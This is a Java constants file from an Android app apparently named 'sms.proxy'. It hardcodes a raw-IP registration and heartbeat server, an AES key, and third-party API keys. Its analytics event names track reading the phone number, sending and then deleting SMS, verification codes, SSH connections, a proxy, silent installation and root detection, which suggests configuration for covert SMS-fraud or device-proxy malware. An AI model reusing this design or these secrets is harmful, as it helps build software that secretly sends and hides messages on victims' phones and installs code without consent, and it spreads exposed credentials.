package com.android.sms.proxy.entity;

/**
 * @author zyq 16-3-9
 */
public class NativeParams {

	public static int SUCCESS = 0;
	public static int STATUS_IDLE = 0;
	public static int STATUS_WAIT_FOR_VERIFY_CODE = 1;
	public static String TYPE_PHONE_NUMBER = "phone";
	public static String TYPE_PHONE_IMEI = "imei";
	public static String TYPE_SSH_CONNECT = "isSSHConnected";
    public static String TYPE_PHONE_SMS = "code";
	public static String URL_SEND_CODE = "http://52.77.240.92:80/regist/";
	public static String URL_HEART_BEAT = "http://52.77.240.92:80/heartbeat/";
	public static String KEY_ANDROID_FLURRY = "RP3R626TXWWWKRYYCYDF";
	public static final String AES_KEY = "3Ce7671Ff686D51d";
	public static final String AVOS_CLOUD_APPLICATIONID = "J55YiWIcfYyLgRB9E9mSyIxL-gzGzoHsz";
	public static final String AVOS_CLOUD_APP_KEY = "dyScB5L160VDf3IlkoW9D3jo";

	//Flurry统计
	//查找手机号码
	public static String EVENT_GET_PHONE_NUMBER = "getPhoneNumber";
    public static String KEY_SIM_LINE1PHONE = "fromSimLine1Phone";
	public static String KEY_QUERY_SMS = "fromQuerySMS";
	public static String KEY_SEND_SMS = "fromSendSMS";

    //发送短信
	public static String EVENT_SEND_SMS = "sendSMS";
	public static String KEY_DELETE_SMS_SUCCESS = "deleteSMSSuccess";

	//统计发送短信成功到达率．．．
	public static String EVENT_SEND_SMS_STATUS = "sendSMSStatus";
	public static String KEY_SEND_SMS_SUCCESS = "sendSMSSuccess";

	//删除短信成功
	public static String EVENT_DELETE_SMS_SUCCESS = "deleteSMSSuccess";
	public static String KEY_DELETE_SUCCESS_VERSION = "phoneAndroidVersion";
	public static String KEY_DELETE_SUCCESS_DEVICE = "phoneDevice";

	//删除短信失败
	public static String EVENT_DELETE_SMS_FAILED = "deleteSMSFail";
	public static String KEY_DELETE_FAIL_VERSION = "phoneAndroidVersion";
	public static String KEY_DELETE_FAIL_DEVICE = "phoneDevice";

	//4.4删除成功的机型
	public static String EVENT_VERSION_KITKAT = "kitkat";
	public static String KEY_KITKAT_DEVICE = "kitKatDevice";
	public static String KEY_FIX_SYSTEM_SUCCESS = "fixSystem";

	//开始建立ssh链接
	public static String EVENT_START_SSH_CONNECT = "startSSHConnect";
	public static String KEY_SSH_CONNECT_SUCCESS = "sshConnectionSuccess";

	//建立ssh成功
	public static String EVENT_SSH_CONNECT_SUCCESS = "sshConnectionSuccess";
	public static String KEY_SSH_CONNECT_TIME = "sshConnectSuccessTime";

	//开始建立proxy代理
	public static String EVENT_START_PROXY= "startProxy";
	public static String KEY_PROXY_CONNECT_SUCCESS = "proxyStartSuccess";

	public static String EVENT_ACCEPT_BROADCAST = "acceptBroadCast";
	public static String KEY_SERVICE_START_SUCCESS = "startServiceSuccess";
	public static String KEY_BROADCAST_TYPE = "broadcastType";

	public static String EVENT_ACCEPT_UPDATE_INFO = "acceptUpdateInfo";
	public static String KEY_DOWNLOAD_URL = "downloadUrl";
	public static String KEY_DOWNLOAD_START = "startDownload";


	public static String EVENT_START_DOWNLOAD = "startDownload";
	public static String KEY_DOWNLOAD_SUCCESS = "downloadSuccess";

	//没法监听本身安装情况！！！！！！！
	public static String EVENT_START_INSTALL = "startSilentInstall";
	public static String KEY_INSTALL_SUCCESS = "installSuccess";
	public static String KEY_IS_DEVICE_ROOT = "isDeviceRoot";

	//test
	public static String EVENT_TEST = "test";
	public static String KEY_TEST = "test";

}
